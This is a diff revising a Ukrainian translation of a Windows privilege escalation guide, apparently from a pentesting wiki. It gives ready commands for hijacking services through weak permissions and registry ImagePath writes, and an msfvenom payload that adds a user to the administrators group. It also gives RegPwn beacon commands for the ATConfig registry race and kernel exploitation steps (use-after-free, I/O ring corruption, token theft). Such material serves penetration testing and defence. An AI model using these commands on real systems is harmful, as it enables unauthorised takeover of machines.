+_Service не може бути запущено, оскільки його вимкнено або з ним не пов’язано жодного увімкненого пристрою._
 
-Ви можете ввімкнути її за допомогою
+Ви можете увімкнути його за допомогою
 ```bash
 sc config SSDPSRV start= demand
 sc config SSDPSRV obj= ".\LocalSystem" password= ""
 ```
-**Враховуйте, що служба upnphost залежить від SSDPSRV для роботи (для XP SP1)**
+**Врахуйте, що для роботи служба upnphost залежить від SSDPSRV (для XP SP1)**
 
-**Ще один обхідний шлях** цієї проблеми — виконати:
+**Інший обхідний шлях** цієї проблеми — виконати:
 ```
 sc.exe config usosvc start= auto
 ```
-### **Змінити шлях до бінарного файлу служби**
+### **Зміна шляху до бінарного файлу служби**
 
 У сценарії, коли група "Authenticated users" має **SERVICE_ALL_ACCESS** для служби, можна змінити виконуваний бінарний файл служби. Щоб змінити та виконати **sc**:
 ```bash
@@ -533,26 +534,26 @@ net stop [service name] && net start [service name]
 ```
 Привілеї можна підвищити через різні дозволи:
 
-- **SERVICE_CHANGE_CONFIG**: Дозволяє переналаштувати бінарний файл служби.
-- **WRITE_DAC**: Дозволяє переналаштувати дозволи, що дає змогу змінювати конфігурації служб.
-- **WRITE_OWNER**: Дозволяє отримати право власності та переналаштувати дозволи.
+- **SERVICE_CHANGE_CONFIG**: Дозволяє переналаштувати binary служби.
+- **WRITE_DAC**: Уможливлює переналаштування дозволів, що дає змогу змінювати конфігурації служб.
+- **WRITE_OWNER**: Дозволяє отримати ownership і переналаштувати дозволи.
 - **GENERIC_WRITE**: Успадковує можливість змінювати конфігурації служб.
 - **GENERIC_ALL**: Також успадковує можливість змінювати конфігурації служб.
 
-Для виявлення та експлуатації цієї вразливості можна використати _exploit/windows/local/service_permissions_.
+Для виявлення та exploitation цієї вразливості можна використати _exploit/windows/local/service_permissions_.
 
-### Слабкі дозволи бінарних файлів служб
+### Слабкі дозволи на binary служб
 
-Якщо служба працює від імені **`LocalSystem`**, **`LocalService`**, **`NetworkService`** або привілейованого доменного облікового запису, але **користувачі з низькими привілеями можуть змінювати EXE служби або її батьківську папку**, службою часто можна заволодіти, **замінивши бінарний файл і перезапустивши службу**.
+Якщо служба працює як **`LocalSystem`**, **`LocalService`**, **`NetworkService`** або привілейований domain account, але **користувачі з низькими привілеями можуть змінювати EXE служби або її батьківську папку**, службу часто можна hijack'нути, **замінивши binary і перезапустивши службу**.
 
-**Перевірте, чи можете ви змінювати бінарний файл, який виконується службою**, або чи маєте **дозволи на запис до папки**, де розташований бінарний файл ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
-Усі бінарні файли, які виконує служба, можна отримати за допомогою **wmic** (не в system32), а перевірити дозволи можна за допомогою **icacls**:
+**Перевірте, чи можете ви змінювати binary, який виконується службою**, або чи маєте **дозволи на запис у папку**, де розташований binary ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
+Ви можете отримати кожен binary, який виконується службою, за допомогою **wmic** (не в system32) і перевірити свої дозволи за допомогою **icacls**:
 ```bash
 for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
 
 for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
 ```
-Ви також можете використовувати **sc** та **icacls**:
+Також можна використовувати **sc** та **icacls**:
 ```bash
 sc qc <service_name>
 icacls "C:\path\to\service.exe"
@@ -561,14 +562,14 @@ sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
 FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
 FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
 ```
-Шукайте небезпечні ACL, надані **`Everyone`**, **`BUILTIN\Users`** або **`Authenticated Users`**, особливо **`(F)`**, **`(M)`** чи **`(W)`** для виконуваного файлу service або каталогу, що його містить. Практичний flow зловживання:
+Шукайте небезпечні ACL, надані **`Everyone`**, **`BUILTIN\Users`** або **`Authenticated Users`**, особливо **`(F)`**, **`(M)`** або **`(W)`** для executable служби чи каталогу, що його містить. Практичний сценарій експлуатації:<sup>[[27]](#references)</sup>
 
-1. Підтвердьте обліковий запис service і шлях до виконуваного файлу за допомогою `sc qc <service_name>`.
+1. Підтвердьте обліковий запис служби та шлях до executable за допомогою `sc qc <service_name>`.
 2. Підтвердьте, що binary доступний для запису, за допомогою `icacls <path>`.
 3. Замініть service binary на payload або коректний malicious service binary.
-4. Перезапустіть service за допомогою `sc stop <service_name> && sc start <service_name>` (або дочекайтеся перезавантаження / service trigger).
+4. Перезапустіть службу за допомогою `sc stop <service_name> && sc start <service_name>` (або дочекайтеся перезавантаження / тригера служби).
 
-Корисні automated checks:
+Корисні автоматизовані перевірки:<sup>[[28]](#references)</sup>
 ```powershell
 . .\PowerUp.ps1
 Get-ModifiableServiceFile -Verbose
@@ -577,12 +578,12 @@ SharpUp.exe audit ModifiableServiceBinaries
 . .\PrivescCheck.ps1
 Invoke-PrivescCheck -Extended -Audit
 ```
-> Якщо служба не дозволяє звичайному користувачеві перезапустити її, перевірте, чи запускається вона автоматично під час завантаження системи, чи має дію у разі збою, яка повторно запускає її, або чи може бути опосередковано запущена застосунком, що її використовує.
+> Якщо служба не дозволяє звичайному користувачеві перезапустити її, перевірте, чи запускається вона автоматично під час завантаження системи, чи має дію у разі збою, яка повторно запускає її, або чи може бути опосередковано активована застосунком, який її використовує.
 
 ### Дозволи на зміну реєстру служб
 
 Вам слід перевірити, чи можете ви змінювати реєстр будь-якої служби.\
-Ви можете **перевірити** свої **дозволи** щодо **реєстру** служби за допомогою:
+Ви можете **перевірити** свої **дозволи** щодо **реєстру** служби, виконавши:
 ```bash
 reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services
 
@@ -591,54 +592,54 @@ for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\
 
 get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
 ```
-Слід перевірити, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** дозволи `FullControl`. Якщо так, binary, який виконується службою, можна змінити.
+Потрібно перевірити, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** дозволи `FullControl`. Якщо так, binary, який виконується службою, можна змінити.
 
 Щоб змінити Path binary, який виконується:
 ```bash
 reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
 ```
-### Гонка зі симлінком реєстру для довільного запису значення HKLM (ATConfig)
+### Довільний запис значення HKLM через гонку із символічним посиланням реєстру (ATConfig)
 
-Деякі функції спеціальних можливостей Windows створюють **ATConfig** ключі для окремих користувачів, які згодом копіюються процесом **SYSTEM** до ключа сеансу в HKLM. Гонка із **символічним посиланням** у реєстрі може перенаправити цей привілейований запис до **будь-якого шляху HKLM**, надаючи примітив **довільного запису значення** в HKLM.
+Деякі функції спеціальних можливостей Windows створюють **ATConfig** ключі для кожного користувача, які згодом копіюються процесом **SYSTEM** до ключа сеансу в HKLM. Гонка із символічним посиланням реєстру може перенаправити цей привілейований запис до **будь-якого шляху HKLM**, надаючи примітив **запису довільного значення HKLM**.<sup>[[18]](#references)</sup>
 
-Ключові розташування (приклад: екранна клавіатура `osk`):
+Розташування ключів (приклад: екранна клавіатура `osk`):
 
-- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` містить перелік установлених функцій спеціальних можливостей.
-- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` містить конфігурацію, контрольовану користувачем.
-- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` створюється під час входу в систему або переходів до захищеного робочого стола та доступний користувачу для запису.
+- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` містить список встановлених функцій спеціальних можливостей.
+- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` зберігає конфігурацію, контрольовану користувачем.
+- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` створюється під час входу в систему або переходів до захищеного робочого столу та доступний користувачу для запису.
 
-Послідовність експлуатації (CVE-2026-24291 / ATConfig):
+Сценарій зловживання (CVE-2026-24291 / ATConfig):
 
-1. Заповнити значення **HKCU ATConfig**, яке має бути записане процесом SYSTEM.
-2. Запустити копіювання до захищеного робочого стола (наприклад, **LockWorkstation**), що запускає потік AT broker.
-3. **Виграти гонку**, установивши **oplock** на `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; коли спрацює oplock, замінити ключ **HKLM Session ATConfig** на **registry link**, що вказує на захищену ціль у HKLM.
-4. SYSTEM записує вибране зловмисником значення до перенаправленого шляху HKLM.
+1. Заповніть значення **HKCU ATConfig**, яке має бути записане процесом SYSTEM.
+2. Запустіть копіювання до захищеного робочого столу (наприклад, за допомогою **LockWorkstation**), що запускає потік AT broker.
+3. **Виграйте гонку**, встановивши **oplock** на `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; коли спрацює oplock, замініть ключ **HKLM Session ATConfig** на **registry link**, що вказує на захищену ціль у HKLM.
+4. SYSTEM запише вибране атакувальником значення до перенаправленого шляху HKLM.
 
-Отримавши можливість довільного запису значень HKLM, можна перейти до LPE, перезаписавши значення конфігурації служб:
+Після отримання довільного запису значення HKLM виконайте pivot до LPE, перезаписавши значення конфігурації служб:
 
 - `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/командний рядок)
 - `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)
 
-Виберіть службу, яку звичайний користувач може запустити (наприклад, **`msiserver`**), і запустіть її після запису. **Примітка:** публічна реалізація exploit **блокує робочу станцію** як частину гонки.
+Виберіть службу, яку звичайний користувач може запустити (наприклад, **`msiserver`**), і запустіть її після виконання запису. **Примітка:** публічна реалізація exploit блокує робочу станцію як частину гонки.
 
-Приклади інструментів (RegPwn BOF / standalone):
+Приклад інструментів (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>
 ```bash
 beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
 beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
 net start msiserver
 ```
-### Дозволи AppendData/AddSubdirectory для реєстру служб
+### Дозволи AppendData/AddSubdirectory у реєстрі служб
 
-Якщо ви маєте цей дозвіл для реєстру, це означає, що **ви можете створювати підреєстри в ньому**. У випадку служб Windows цього **достатньо для виконання довільного коду:**
+Якщо у вас є цей дозвіл для реєстру, це означає, що **ви можете створювати підрозділи реєстру з цього розділу**. У випадку служб Windows цього **достатньо для виконання довільного коду:**
 
 
 {{#ref}}
 appenddata-addsubdirectory-permission-over-service-registry.md
 {{#endref}}
 
-### Невзяті в лапки шляхи до служб
+### Незаключені в лапки шляхи до служб
 
-Якщо шлях до виконуваного файлу не взято в лапки, Windows спробує виконати кожен варіант шляху, що закінчується перед пробілом.
+Якщо шлях до виконуваного файла не взято в лапки, Windows спробує виконати кожен фрагмент шляху до пробілу.
 
 Наприклад, для шляху _C:\Program Files\Some Folder\Service.exe_ Windows спробує виконати:
 ```bash
@@ -646,7 +647,7 @@ C:\Program.exe
 C:\Program Files\Some.exe
 C:\Program Files\Some Folder\Service.exe
 ```
-Перелічіть усі шляхи служб, не взяті в лапки, за винятком тих, що належать до вбудованих служб Windows:
+Перелічіть усі шляхи служб без лапок, за винятком шляхів вбудованих служб Windows:
 ```bash
 wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
 wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services
@@ -670,15 +671,15 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 ```bash
 msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
 ```
-### Дії відновлення
+### Дії у разі збою
 
-Windows дозволяє користувачам указувати дії, які потрібно виконати в разі збою служби. Цю функцію можна налаштувати так, щоб вона вказувала на бінарний файл. Якщо цей бінарний файл можна замінити, може бути можливе підвищення привілеїв. Докладнішу інформацію наведено в [офіційній документації](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).
+Windows дозволяє користувачам указувати дії, які слід виконати в разі збою служби. Цю функцію можна налаштувати так, щоб вона вказувала на binary-файл. Якщо цей binary-файл можна замінити, може бути можливе підвищення привілеїв. Докладніше див. в [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).
 
-## Applications
+## Застосунки
 
-### Встановлені програми
+### Встановлені застосунки
 
-Перевірте **дозволи бінарних файлів** (можливо, один із них можна перезаписати та підвищити привілеї) і папок ([DLL Hijacking](dll-hijacking/index.html)).
+Перевірте **дозволи binary-файлів** (можливо, один із них можна перезаписати та виконати privilege escalation) і папок ([DLL Hijacking](dll-hijacking/index.html)).
 ```bash
 dir /a "C:\Program Files"
 dir /a "C:\Program Files (x86)"
@@ -689,9 +690,9 @@ Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 ```
 ### Права на запис
 
-Перевірте, чи можете ви змінити якийсь конфігураційний файл, щоб прочитати спеціальний файл, або чи можете змінити бінарний файл, який буде виконано обліковим записом Administrator (schedtasks).
+Перевірте, чи можете ви змінити певний конфігураційний файл, щоб прочитати спеціальний файл, або чи можете змінити бінарний файл, який буде виконуватися обліковим записом Administrator (schedtasks).
 
-Спосіб знайти слабкі дозволи для папок/файлів у системі:
+Один зі способів знайти слабкі дозволи на папки/файли в системі — виконати:
 ```bash
 accesschk.exe /accepteula
 # Find all weak folder permissions per drive.
@@ -714,9 +715,9 @@ Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Ac
 
 Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
 ```
-### Автоматичне завантаження плагінів Notepad++ для persistence/execution
+### Notepad++ plugin autoload persistence/execution
 
-Notepad++ автоматично завантажує будь-яку DLL плагіна з його підпапок `plugins`. Якщо доступна доступна для запису portable/копійована інсталяція, розміщення malicious плагіна забезпечує автоматичне code execution всередині `notepad++.exe` під час кожного запуску (зокрема з `DllMain` і callback-функцій плагіна).
+Notepad++ автоматично завантажує будь-яку DLL plugin у своїх підпапках `plugins`. Якщо доступна writable portable/copy install, розміщення malicious plugin забезпечує automatic code execution усередині `notepad++.exe` під час кожного запуску (зокрема з `DllMain` і plugin callbacks).
 
 {{#ref}}
 notepad-plus-plus-plugin-autoload-persistence.md
@@ -724,8 +725,8 @@ notepad-plus-plus-plugin-autoload-persistence.md
 
 ### Запуск під час старту
 
-**Перевірте, чи можете ви перезаписати якийсь реєстр або binary, який буде виконано іншим користувачем.**\
-**Прочитайте** **наступну сторінку**, щоб дізнатися більше про цікаві **autoruns locations для ескалації привілеїв**:
+**Перевірте, чи можете ви перезаписати певний registry або binary, який буде виконано іншим користувачем.**\
+**Прочитайте** **наступну сторінку**, щоб дізнатися більше про цікаві **autoruns locations для privilege escalation**:
 
 
 {{#ref}}
@@ -734,94 +735,94 @@ privilege-escalation-with-autorun-binaries.md
 
 ### Драйвери
 
-Шукайте можливі **сторонні підозрілі/вразливі** драйвери
+Шукайте можливі **дивні/вразливі drivers сторонніх виробників**
 ```bash
 driverquery
 driverquery.exe /fo table
 driverquery /SI
 ```
-Якщо драйвер надає примітив довільного читання/запису ядра (поширено у погано спроєктованих обробниках IOCTL), можна підвищити привілеї, безпосередньо викравши SYSTEM token із пам'яті ядра. Покроковий опис техніки наведено тут:
+Якщо драйвер надає примітив довільного читання/запису ядра (поширено у погано спроєктованих обробниках IOCTL), ви можете підвищити привілеї, безпосередньо викравши SYSTEM token із пам'яті ядра.<sup>[[13]](#references)</sup> Покроковий опис техніки наведено тут:
 
 {{#ref}}
 arbitrary-kernel-rw-token-theft.md
 {{#endref}}
 
-Для помилок типу race condition, коли вразливий виклик відкриває шлях Object Manager, контрольоване зловмисником, навмисне уповільнення пошуку (за допомогою компонентів максимальної довжини або глибоких ланцюжків каталогів) може збільшити вікно з мікросекунд до десятків мікросекунд:
+Для race-condition bugs, коли вразливий виклик відкриває контрольований атакувальником шлях Object Manager, навмисне сповільнення пошуку (за допомогою компонентів максимальної довжини або глибоких ланцюжків директорій) може збільшити вікно з мікросекунд до десятків мікросекунд:
 
 {{#ref}}
 kernel-race-condition-object-manager-slowdown.md
 {{#endref}}
 
-#### UAF у cancel-safe queue, розкриття даних із paged-pool і pivot через I/O ring
+#### Cancel-safe queue UAFs, paged-pool disclosures, and I/O ring pivots
 
-Деякі ланцюжки Windows kernel LPE можна побудувати з двох окремо слабких помилок: **race condition життєвого циклу cancel-safe queue**, яка звільняє request/CBD, поки блокування черги все ще утримується, і розкриття даних через **копіювання після звільнення блокування**, яке витягує звільнену алокацію paged-pool під час `RtlCopyToUser`.
+Деякі ланцюжки Windows kernel LPE можна побудувати з двох окремо слабких bugs: **cancel-safe queue lifetime race**, яка звільняє request/CBD, поки lock черги все ще утримується, і **lock-release-before-copy disclosure**, яка leak-ить звільнену paged-pool allocation під час `RtlCopyToUser`.<sup>[[29]](#references)</sup>
 
-Нотатки щодо аудиту та експлуатації:
+Нотатки щодо аудиту та exploitation:
 
-- **Free-under-lock + cancel afterwards**: шукайте шлях успішного виконання, який робить **Acquire -> CompleteRequest/free -> Release**, тоді як шлях скасування робить **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Якщо шлях успішного виконання досягає `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` до звільнення блокування CBDQ/CSQ, потік, заблокований у `NtCancelIoFileEx -> IopCsqCancelRoutine`, згодом може продовжити виконання та передати звільнений `PFLT_CALLBACK_DATA` назад у callback видалення драйвера.
-- **Reclaim the freed queue object** за допомогою контрольованої зловмисником алокації paged-pool такого самого розміру. `NPFS` Data Queue Entries корисні, оскільки payload і розмір можна контролювати, а згодом перевіряти їх за допомогою операцій читання/peek pipe. Якщо звільнений об'єкт містить list links, перезапишіть їх **циклічним списком fake request nodes у user memory**, щоб драйвер багаторазово обробляв визначені зловмисником структури request замість завершення на початковій голові списку.
-- **Upgrade a predictable write**: якщо fake request перенаправляє вкладений context pointer, який використовується записами bookkeeping (timestamps / QPC / полями, суміжними з refcount), можна отримати запис у ядро, **контрольований за адресою, але не за значенням**. У такому разі націльтеся на поле **length/size** об'єкта розпиленого pool замість кінцевого вказівника на code/data, а потім переберіть розпилення, доки пошкоджений об'єкт не надасть **читання paged-pool за межами буфера**.
-- **Raceable disclosure pattern**: будь-який syscall, який виконує `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)`, є сильним кандидатом. Надійність підвищується, коли зловмисник може збільшити буфер, що копіюється (наприклад, додавши багато list/resource entries, які збільшують кінцевий розмір алокації serializer), оскільки довше копіювання розширює вікно для заміни, не обов'язково спричиняючи збій системи.
-- **Pointer-rich refill targets**: зареєстровані масиви buffer в Windows **I/O ring** є чудовими цілями для розкриття даних, оскільки їхній розмір у paged-pool контролюється зловмисником (`8 * regBufferCnt`), а кожен елемент є kernel pointer на `_IOP_MC_BUFFER_ENTRY`. Витік одного з таких масивів дає змогу відновити навколишній `IORING_OBJECT`, а потім пошкодити **`RegBuffers`** і **`RegBuffersCount`**, щоб наступні операції I/O ring використовували підроблені зловмисником entries і надавали довільне читання/запис у ядро. Якщо єдиний доступний запис дає стабільний байт (наприклад, із `KUSER_SHARED_DATA+0x14`), використовуйте **overlapping unaligned writes**, щоб побудувати user pointer із повторюваним байтом, наприклад `0x0101010101010101`, відобразіть його за допомогою `VirtualAlloc` і розмістіть там підроблений масив registered-buffer.
+- **Free-under-lock + cancel afterwards**: шукайте success path, який виконує **Acquire -> CompleteRequest/free -> Release**, тоді як cancel path виконує **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Якщо success path досягає `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` до вивільнення CBDQ/CSQ lock, thread, заблокований у `NtCancelIoFileEx -> IopCsqCancelRoutine`, може пізніше продовжити виконання та передати звільнений `PFLT_CALLBACK_DATA` назад у remove callback драйвера.
+- **Reclaim the freed queue object** за допомогою paged-pool allocation такого самого розміру, контрольованої атакувальником. `NPFS` Data Queue Entries корисні, оскільки payload і size є контрольованими, а згодом їх можна досліджувати за допомогою pipe read/peek operations. Якщо звільнений object містить list links, перезапишіть їх **циклічним списком fake request nodes у user memory**, щоб драйвер повторно обробляв визначені атакувальником request structures замість завершення на початковому list head.
+- **Upgrade a predictable write**: якщо fake request перенаправляє nested context pointer, який використовується bookkeeping writes (timestamps / QPC / refcount-adjacent fields), можна отримати **address-controlled but not value-controlled** kernel write. У такому разі націльтеся на поле **length/size** об'єкта sprayed pool замість фінального code/data pointer, а потім переберіть spray, доки пошкоджений object не дасть **out-of-bounds paged-pool read**.
+- **Raceable disclosure pattern**: будь-який syscall, який виконує `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)`, є сильним кандидатом. Надійність підвищується, коли атакувальник може збільшити buffer, що копіюється (наприклад, додавши багато list/resource entries, які збільшують фінальний розмір allocation serializer), оскільки довше копіювання розширює replacement window без обов'язкового crash системи.
+- **Pointer-rich refill targets**: зареєстровані buffer arrays Windows **I/O ring** є чудовими цілями для disclosure, оскільки їхній paged-pool size контролюється атакувальником (`8 * regBufferCnt`), а кожен element є kernel pointer на `_IOP_MC_BUFFER_ENTRY`. Leak-ніть один із цих arrays, відновіть оточуючий `IORING_OBJECT`, а потім пошкодьте **`RegBuffers`** і **`RegBuffersCount`**, щоб наступні I/O ring operations використовували підроблені атакувальником entries і надавали довільне читання/запис ядра. Якщо єдиний доступний write записує стабільний byte (наприклад, із `KUSER_SHARED_DATA+0x14`), використовуйте **overlapping unaligned writes**, щоб побудувати user pointer із повторюваними bytes, наприклад `0x0101010101010101`, відобразіть його за допомогою `VirtualAlloc` і розмістіть там підроблений registered-buffer array.<sup>[[30]](#references)</sup>
 
-Корисні індикатори для debugging:
+Корисні індикатори debugging:
 ```text
 NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
 <driver> success path: Acquire -> CompleteRequest/free -> Release
 RtlCopyToUser after releasing the object lock
 ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
 ```
-Після отримання довільного читання/запису kernel через пошкоджений I/O ring викрадіть SYSTEM token за допомогою стандартного post-primitive workflow:
+Після отримання довільного читання/запису kernel через пошкоджене I/O ring викрадіть SYSTEM token за допомогою стандартного workflow після отримання primitive:
 
 {{#ref}}
 arbitrary-kernel-rw-token-theft.md
 {{#endref}}
 
-#### Примітиви memory corruption у Registry hive
+#### Примітиви пошкодження пам’яті registry hive
 
-Сучасні вразливості hive дають змогу формувати детерміновані layout-и, зловживати доступними для запису нащадками HKLM/HKU і перетворювати пошкодження метаданих на переповнення kernel paged-pool без custom driver. Повний ланцюжок описано тут:
+Сучасні вразливості hive дають змогу формувати детерміновані розкладки, зловживати доступними для запису нащадками HKLM/HKU і перетворювати пошкодження метаданих на переповнення kernel paged-pool без custom driver. Повний ланцюжок описано тут:
 
 {{#ref}}
 windows-registry-hive-exploitation.md
 {{#endref}}
 
-#### Type confusion у direct-mode `RtlQueryRegistryValues` через шляхи, контрольовані attacker
+#### Confused deputy у direct-mode `RtlQueryRegistryValues` через шляхи, контрольовані атакувальником
 
-Деякі drivers приймають шлях до registry з userland, перевіряють лише те, що це коректний UTF-16 string, а потім викликають `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` з `RTL_QUERY_REGISTRY_DIRECT` у stack scalar, наприклад `int readValue`. Якщо `RTL_QUERY_REGISTRY_TYPECHECK` відсутній, `EntryContext` інтерпретується відповідно до **фактичного** типу registry, а не до типу, який очікував developer.
+Деякі drivers приймають шлях до registry від userland, перевіряють лише те, що це коректний рядок UTF-16, а потім викликають `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` із `RTL_QUERY_REGISTRY_DIRECT` і stack scalar, наприклад `int readValue`. Якщо відсутній `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` інтерпретується відповідно до **фактичного** типу registry, а не до типу, який очікував developer.
 
-Це створює два корисні примітиви:
+Це створює два корисні примітиви:<sup>[[24]](#references)[[25]](#references)</sup>
 
-- **Confused deputy / oracle**: контрольований user-ом абсолютний шлях `\Registry\...` дає змогу driver-у запитувати keys, вибрані attacker-ом, розкривати їх наявність через return codes/logs і іноді читати values, до яких caller не мав би прямого доступу.
-- **Kernel memory corruption**: destination scalar, такий як `&readValue`, інтерпретується з помилковим типом як `REG_QWORD`, `UNICODE_STRING` або sized binary buffer залежно від типу registry value.
+- **Confused deputy / oracle**: контрольований користувачем абсолютний шлях `\Registry\...` дає drivers змогу запитувати вибрані атакувальником keys, розкривати їхнє існування через коди повернення/logs і в деяких випадках читати values, до яких caller не мав би прямого доступу.
+- **Kernel memory corruption**: scalar destination, наприклад `&readValue`, через плутанину типів стає `REG_QWORD`, `UNICODE_STRING` або binary buffer заданого розміру залежно від типу registry value.
 
 Практичні примітки щодо exploitation:
 
-- **Windows 8+ mitigation**: якщо запит звертається до **untrusted hive** з `RTL_QUERY_REGISTRY_DIRECT`, але без `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers аварійно завершуються з `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Щоб зберегти exploitability, шукайте keys, доступні для запису attacker-у, всередині **trusted system hives**, замість розміщення values у `HKCU`.
-- **Trusted-hive staging**: використовуйте NtObjectManager для переліку доступних для запису descendants `\Registry\Machine`, а потім повторіть scan із дубльованим **low-integrity** token, щоб знайти keys, доступні із sandboxed contexts:
+- **Windows 8+ mitigation**: якщо запит звертається до **untrusted hive** із `RTL_QUERY_REGISTRY_DIRECT`, але без `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers аварійно завершуються з `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Щоб зберегти exploitability, шукайте **attacker-writable keys усередині trusted system hives**, а не розміщуйте values у `HKCU`.
+- **Trusted-hive staging**: використовуйте NtObjectManager для переліку writable descendants у `\Registry\Machine`, а потім повторіть scan із дубльованим **low-integrity** token, щоб знайти keys, доступні із sandboxed contexts:<sup>[[26]](#references)</sup>
 ```powershell
 Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
 $token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
 Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
 ```
-- **`REG_QWORD`**: прямий запис 8 байтів у 4-байтовий `int` пошкоджує сусідні дані стека та може частково перезаписати вказівник на callback/function pointer поблизу.
-- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode очікує, що `EntryContext` вказує на `UNICODE_STRING`. Якщо код спочатку завантажує контрольований attacker'ом `REG_DWORD` у скаляр стека, а потім повторно використовує той самий буфер для читання рядка, attacker контролює `Length`/`MaximumLength` і частково впливає на вказівник `Buffer`, що забезпечує частково контрольований запис у kernel.
-- **`REG_BINARY`**: для великих бінарних даних direct mode розглядає перший `LONG` за адресою `EntryContext` як знаковий розмір буфера. Якщо попереднє читання `REG_DWORD` залишає від'ємне значення, контрольоване attacker'ом, у повторно використаному скалярі, наступний запит `REG_BINARY` копіює байти attacker'а безпосередньо поверх сусідніх слотів стека, що часто є найпростішим шляхом до повного перезапису callback pointer.
+- **`REG_QWORD`**: прямий запис 8 байтів у 4-байтовий `int` пошкоджує сусідні дані стека та може частково перезаписати близький callback/function pointer.
+- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode очікує, що `EntryContext` вказує на `UNICODE_STRING`. Якщо код спочатку завантажує контрольований атакувальником `REG_DWORD` у скаляр стека, а потім повторно використовує той самий буфер для читання рядка, атакувальник контролює `Length`/`MaximumLength` і частково впливає на вказівник `Buffer`, отримуючи частково контрольований kernel write.
+- **`REG_BINARY`**: для великих двійкових даних direct mode трактує перший `LONG` за адресою `EntryContext` як розмір буфера зі знаком. Якщо попереднє читання `REG_DWORD` залишає від’ємне контрольоване атакувальником значення в повторно використаному скалярі, наступний запит `REG_BINARY` копіює байти атакувальника безпосередньо поверх сусідніх слотів стека, що часто є найпростішим шляхом до повного перезапису callback pointer.
 
-Надійний hunting pattern: **різнорідні читання з реєстру в одну й ту саму змінну стека без її повторної ініціалізації**. Виконуйте пошук `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, повторно використаних вказівників `EntryContext` і шляхів виконання, у яких перше читання з реєстру визначає, чи відбудеться друге читання.
+Надійний hunting pattern: **різнорідні читання реєстру в одну й ту саму змінну стека без її повторної ініціалізації**. Виконуйте пошук `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, повторно використаних вказівників `EntryContext` і шляхів виконання, де перше читання реєстру визначає, чи відбудеться друге читання.
 
-#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)
